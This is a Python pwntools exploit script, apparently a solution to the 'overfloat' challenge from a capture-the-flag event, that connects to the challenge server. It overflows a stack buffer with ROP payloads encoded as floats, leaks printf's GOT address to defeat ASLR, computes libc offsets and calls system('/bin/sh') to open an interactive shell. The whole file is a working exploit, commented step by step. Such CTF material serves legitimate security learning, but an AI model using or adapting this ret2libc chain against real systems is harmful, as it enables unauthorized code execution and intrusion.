#!/usr/bin/env python
from pwn import *
import struct

BINARY = "./overfloat_patched" # patched alarm() call
TASK_LIBC = "./libc-2.27.so"
REMOTE = ("challenges.fbctf.com", 1341)

#env = {}
env = { 'LD_PRELOAD': TASK_LIBC } # will segfault if not on ubuntu

context.arch = ELF(BINARY).arch
context.terminal = ["gnome-terminal", "-e"] # change to konsole -e if you run Konsole

#s = process(BINARY, env=env)
s = remote(*REMOTE)

cmds = ["b *0x400a0f", "b *0x400a1f"]

gdbscript = '\n'.join([str(x) for x in cmds])

#gdb.attach(s, exe=BINARY, gdbscript=gdbscript)

def btf(buff): # bytes to float, does the opposite of atof(), converts 4 bytes into a float string like "12.5325"
    val = struct.unpack('f', buff)[0]
    return str(val)

prompt_counter = 0 # counters for the index, and LAT/LON respectively, used by nextprompt()
prompt_latlon = 0
def nextprompt(): # used to get next prompt "LAT[0]: , LON[0]: , LAT[1]: etc"
    global prompt_latlon, prompt_counter
    prompt = ""
    if prompt_latlon == 0:
        prompt += "LAT[" + str(prompt_counter) + "]: "
    else:
        prompt += "LON[" + str(prompt_counter) + "]: "
        prompt_counter = (prompt_counter + 1) % 10
    
    prompt_latlon = (prompt_latlon + 1) % 2
    return prompt

# splits payload bytes into packs of 4, converts them to floats and inputs them after each prompt
def input_payload(payload):
    lines = [ btf(payload[i:i + 4]) for i in range(0, len(payload), 4) ] # convert payload to lines to be input in sequential LAT[] LON[] prompts
    if len(lines) % 2 != 0:
        lines.append("0") # dummy line so that the number of lines is even and we dont get LONGTITUDE WHERE
    lines.append("done") # finishing line

    for line in lines: # for each line
        print(s.recvuntil(nextprompt()) + line) # wait for prompt and print what we're about to input
        s.sendline(line) # input
    print(s.recvuntil("BON VOYAGE!") + " ---- finished inputing payload")

padding = b"A" * 48 # padding to fill the buffer in
rbp = b"B" * 8 # saved rbp

### ASLR SAFE BYTES - these addresses are found in the binary itself, which is not PIC
### so addresses stay the same
POPRDI = struct.pack("P", 0x400a83) # pop rdi; ret; - ROP gadget
RET = struct.pack("P", 0x400a84) # single ret instruction, good for stack aligning (if stack isnt 16-aligned system() will segfault)
MAIN = struct.pack("P", 0x400993) # main function, so that we can input more than one payload
PUTS = struct.pack("P", 0x400690) # puts() for outputing memory

FAKEPRINTF = struct.pack("P", 0x602038) # address of GOT entry for printf

### ASLR UNSAFE - offsets relative from ASLRed libc .text base address (calculated using gdb)
cmdstring_offset = 0x1b3e9a # /bin/sh
realsystem_offset = 0x4f440 # realsystem_offset()
realprintf_offset = 0x64e80 # printf()

### ACTUAL EXPLOIT BELOW ###

### first payload - call puts with address of GOT entry for printf
### + RET for alignment on stack
payload = padding + rbp
payload += RET + POPRDI + FAKEPRINTF
payload += PUTS + RET + MAIN

prompt_counter = 0
prompt_latlon = 0
input_payload(payload)

text = s.recvuntil(" _ .--.") # recieve output till the baloon ascii art
print("----ARTIFICIAL PRINTF----")
print("BEGIN RECEIVED TEXT:" + text + ":END RECEIVED TEXT")

# the actual address is in second line, we read 6 bytes from memory (as most significant 2 bytes are null)
# append 2 null bytes to it so unpack() doesnt complain (LSB first, so we append 2 MSB bytes to the end)
text = bytes(text.split("\n")[1])[0:6] + b'\x00\x00'

realprintf = struct.unpack("P", text)[0]

### some informative printing
print("LEAKED REALPRINTF: " + hex(realprintf))
code_base = realprintf - realprintf_offset
print("LEAKED CODEBASE: " + hex(code_base))

realsystem = code_base + realsystem_offset
cmdstring = code_base + cmdstring_offset

print("system() at " + hex(realsystem))
print("\"/bin/sh\" at " + hex(cmdstring))

### second payload - call system() with a string "/bin/sh"
### + again RET for alignment
payload2 = padding + rbp
payload2 += POPRDI + struct.pack("P", cmdstring)
payload2 += RET + struct.pack("P", realsystem)

prompt_counter = 0
prompt_latlon = 0
input_payload(payload2)

### if everything goes well we should have a shell from now on
s.interactive()
